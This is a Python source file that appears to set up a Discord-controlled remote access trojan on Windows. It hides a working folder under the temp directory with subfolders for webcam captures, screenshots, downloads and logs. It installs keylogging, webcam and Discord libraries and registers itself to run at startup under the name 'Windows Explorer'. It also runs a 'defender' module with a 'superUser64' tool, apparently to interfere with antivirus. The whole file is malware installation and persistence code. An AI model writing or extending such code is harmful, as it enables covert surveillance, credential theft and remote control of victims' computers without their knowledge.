import os
import subprocess
import venv

def Hide():
    folderTarg = "%temp%\\123456789\\"
    payload = r"echo {}".format(folderTarg)
    execute = subprocess.run(payload, shell=True, capture_output=True)
    folder = execute.stdout
    print(folder.decode(encoding="utf-8"))
    folder = folder.decode(encoding="utf-8")
    folderstr = folder.replace(r"\\", "\\").replace("\r\n", "")
    print(folderstr)

    try:
        getSettled(folderstr)
    except Exception as e:
        print("An error has occured: " + str(e))
    os.chdir(folderstr)
    return True

def getSettled(targetDir):
    os.mkdir(targetDir)
    os.mkdir("{}\\downloads".format(targetDir))
    os.mkdir("{}\\WebcamCaptures".format(targetDir))
    os.mkdir("{}\\ScreenShots".format(targetDir))
    os.mkdir("{}\\logs".format(targetDir))
    payload = "copy .\\*.py {}\\ && copy .\\*.bat {}\\ && copy .\\.env {}\\ ".format(targetDir, targetDir, targetDir)
    copyAllNecessary = subprocess.run(payload, shell=True, capture_output=True)
    if copyAllNecessary.stderr.__len__() > 0: raise Exception(copyAllNecessary.stderr)
    
    # Create the virtual environment
    venv_dir = os.path.join(targetDir, "venv")
    venv.create(venv_dir, with_pip=True)
    
    # Activate the virtual environment and install packages
    activate_script = os.path.join(venv_dir, "Scripts", "activate.bat")
    pip_install_cmd = f"{activate_script} && pip install discord aiohttp pillow legacy-cgi audioop-lts pynput python-dotenv opencv-python"
    goAhead = subprocess.run(pip_install_cmd, shell=True, capture_output=True)
    print(goAhead.stdout.decode(), goAhead.stderr.decode(), sep="\n\n\n")

def Activated(targetDir):
    import persist

    persist.add_to_startup_registry("Windows Explorer", "python.exe {}\\discordbot.py".format(targetDir), True)
    
    import defender

    targetFile = "downloads\\superUser64 /ws"
    defenderFile = ".\\defender.py && .\\ThreadManager.py"
    payload = "{0} python.exe {1}".format(targetFile, defenderFile)
    docoolstuff = subprocess.run(payload, shell=True, capture_output=True)
    print(docoolstuff.stdout.decode("utf-8"), docoolstuff.stderr.decode("utf-8"), sep="\n\n")
    
    botFile = os.path.join(targetDir, "run_discordbot.bat")
    botpayload = botFile
    import ThreadManager
    print(botpayload)
    
    print(f"Running batch file: {botFile}")

    #startBot = subprocess.run(botpayload, shell=True, capture_output=True)
    thread = ThreadManager.ThreadManager("DiscordBot", subprocess.run, args=(botpayload,))
    thread.start()
    thread.join()
    return True

def startBotFunc(botPayload):
    command = subprocess.run(botPayload)

if __name__ == "__main__":
    hiding = Hide()
    activating = Activated(os.getcwd())
